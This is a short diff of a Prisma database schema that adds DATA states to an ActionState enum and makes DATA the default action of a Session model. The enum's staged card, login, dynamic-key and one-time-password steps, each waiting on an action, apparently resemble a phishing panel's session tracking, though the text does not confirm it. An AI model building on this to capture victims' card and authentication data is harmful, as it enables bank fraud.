@@ -22,18 +22,26 @@ enum SessionState {
 }
 
 enum ActionState {
+  DATA
+  DATA_WAIT_ACTION
+  DATA_ERROR
+
   CC
   CC_WAIT_ACTION
   CC_ERROR
+
   AUTH
   AUTH_WAIT_ACTION
   AUTH_ERROR
+
   DINAMIC
   DINAMIC_WAIT_ACTION
   DINAMIC_ERROR
+
   OTP
   OTP_WAIT_ACTION
   OTP_ERROR
+
   CUSTOM_ERROR
   FINISH
 }
@@ -41,7 +49,7 @@ enum ActionState {
 model Session {
   id                    String       @id @default(uuid())
   state                 SessionState @default(ACTIVE)
-  action                ActionState  @default(AUTH)
+  action                ActionState  @default(DATA)
   step                  String?
   ip                    String?
   name                  String?
